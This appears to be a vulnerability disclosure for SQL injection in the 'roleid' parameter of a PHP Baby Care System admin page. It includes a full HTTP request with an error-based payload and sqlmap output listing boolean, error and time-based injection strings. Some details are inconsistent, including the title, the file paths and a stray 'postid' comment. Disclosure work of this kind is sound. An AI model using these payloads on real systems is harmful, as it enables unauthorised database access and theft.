## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/pagerole.php&action=delete&value=1&roleid=

![image](https://user-images.githubusercontent.com/54017627/161354607-f6411945-6529-4b2b-8f62-fba8c438d4f6.png)

Vulnerability location: /BabyCare/admin.php?id=pagerole&action=delete&roleid=3&roleid= //postid is Injection point

[+]Payload:  /BabyCare/admin.php?id=pagerole&action=delete&roleid=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+&image= //roleid is Injection point

```sql
GET /BabyCare/admin.php?id=pagerole&action=delete&roleid=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+&image= HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161354508-76abf092-8537-495c-a11d-49cdb777ce06.png)

```sql
---
Parameter: roleid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=pagerole&action=delete&roleid=3' RLIKE (SELECT (CASE WHEN (7695=7695) THEN 3 ELSE 0x28 END))-- GKRk&image=

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=pagerole&action=delete&roleid=3' AND EXTRACTVALUE(4186,CONCAT(0x5c,0x71627a7a71,(SELECT (ELT(4186=4186,1))),0x716b717871))-- YUxq&image=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=pagerole&action=delete&roleid=3' AND (SELECT 7670 FROM (SELECT(SLEEP(5)))HXsL)-- vcKn&image=
---
```

![image](https://user-images.githubusercontent.com/54017627/161354622-de63b411-b777-4c25-98d3-f83bf58ceef8.png)
